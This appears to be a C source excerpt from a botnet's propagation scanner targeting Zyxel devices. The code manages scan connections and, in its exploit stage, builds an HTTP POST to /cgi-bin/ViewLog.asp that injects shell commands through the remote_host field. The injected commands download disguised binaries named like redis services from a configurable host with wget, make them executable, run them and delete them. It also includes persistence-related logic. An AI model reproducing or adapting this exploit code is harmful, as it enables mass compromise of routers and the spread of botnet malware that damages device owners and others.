...
static struct zyxelscanner_scanner_connection *zyxel_conn_table;
uint32_t zyxelscanner_fake_time = 0;
static uint32_t zyxel_local_addr = 0;
static char zyxel_bins_host[512] = {0}; /* runtime-overridable bins host */
...
void zyxelscanner_scanner_init(const char *bins_host)
{
    int i = 0;
    ...
    /* Store bins_host override: use arg if provided, else fall back to global */
    if (bins_host && bins_host[0]) {
        strncpy(zyxel_bins_host, bins_host, sizeof(zyxel_bins_host) - 1);
        zyxel_bins_host[sizeof(zyxel_bins_host) - 1] = '\0';
    } else {
        strncpy(zyxel_bins_host, SCANNER_BINS_HOST, sizeof(zyxel_bins_host) - 1);
        zyxel_bins_host[sizeof(zyxel_bins_host) - 1] = '\0';
    }
    ...
    /* Release control port so persistence detects main process death */
    if (g_ctrl_fd >= 0) { close(g_ctrl_fd); g_ctrl_fd = -1; }

    zyxel_local_addr = util_local_addr();

    rand_init();
    zyxelscanner_fake_time = time(NULL);
    zyxel_conn_table = calloc(zyxelscanner_SCANNER_MAX_CONNS, sizeof(struct zyxelscanner_scanner_connection));
    if (!zyxel_conn_table) return;
    for(i = 0; i < zyxelscanner_SCANNER_MAX_CONNS; i++)
    {
        zyxel_conn_table[i].state = zyxelscanner_SC_CLOSED;
        zyxel_conn_table[i].fd = -1;
    }
    ...
    while(TRUE)
    {
        ...
        while(TRUE)
        {
            ...
            {
                if(zyxel_conn_table[n].state == zyxelscanner_SC_CLOSED)
                {
                    conn = &zyxel_conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }
            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if(err == 0 && ret == 0)
                {
                    if(conn->state == zyxelscanner_SC_EXPLOIT_STAGE2)
                    {
                        ...
                        /* Try multiple arch binaries — first successful exec wins */
                        snprintf(conn->payload_buf, sizeof(conn->payload_buf),
                            "POST /cgi-bin/ViewLog.asp HTTP/1.1\r\n"
                            "Host: 127.0.0.1\r\nConnection: keep-alive\r\n"
                            "Accept-Encoding: gzip, deflate\r\nAccept: */*\r\n"
                            "User-Agent: Mozilla/5.0 *zyxel\r\n"
                            "Content-Length: 700\r\n"
                            "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
                            " remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1"
                            "&LogFlag=0&remote_host=%%3bcd+/tmp;"
                            "for+b+in+redis-conteinerd+redis-conteinerd-shim+redis-credentiald+redis-composd+redis-runcd+redis-buildxd+redis-daemon+redis-proxyd;"
                            "do+wget+http://%s/$b+-O+.z+2>/dev/null+||+continue;"
                            "chmod+777+.z;./.z+b0at.zyxel;rm+-f+.z;break;done"
                            "%%3b%%23&remoteSubmit=Save\r\n\r\n",
                            zyxel_bins_host);
